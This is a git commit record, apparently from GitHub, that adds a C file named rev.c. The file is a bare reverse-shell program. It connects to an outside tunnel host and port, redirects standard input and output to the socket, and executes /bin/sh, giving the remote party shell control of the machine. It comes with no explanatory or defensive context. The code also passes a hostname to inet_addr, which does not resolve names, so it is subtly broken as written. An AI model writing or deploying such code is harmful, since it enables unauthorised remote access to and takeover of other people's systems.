c9f362ceb8204d190dd68141e2295577dfb148b2
Yiğit Aydemir <68844502+st4inl3s5@users.noreply.github.com>
2025-02-20 17:37:49 +0300

    Add files via upload

---
+++ rev.c
@@ -0,0 +1,28 @@
+#include <stdio.h>
+#include <unistd.h>
+#include <netinet/in.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <arpa/inet.h>
+
+#define REMOTE_ADDR "java-atomic.gl.at.ply.gg"
+#define REMOTE_PORT 16652
+
+int main(int argc, char *argv[])
+{
+    struct sockaddr_in sa;
+    int s;
+
+    sa.sin_family = AF_INET;
+    sa.sin_addr.s_addr = inet_addr(REMOTE_ADDR);
+    sa.sin_port = htons(REMOTE_PORT);
+
+    s = socket(AF_INET, SOCK_STREAM, 0);
+    connect(s, (struct sockaddr *)&sa, sizeof(sa));
+    dup2(s, 0);
+    dup2(s, 1);
+    dup2(s, 2);
+
+    execve("/bin/sh", 0, 0);
+    return 0;
+}
